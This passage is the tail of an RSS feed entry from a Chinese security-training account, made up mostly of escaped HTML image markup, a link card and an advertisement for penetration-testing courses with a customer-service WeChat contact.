class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;新手入门 | 梦境穿越 - 主题技能包&lt;/a&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
-<author>二向箔安全学院</author>
-<guid isPermaLink="false">2020-01-10-102166928</guid>
-<pubDate>Fri, 10 Jan 2020 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
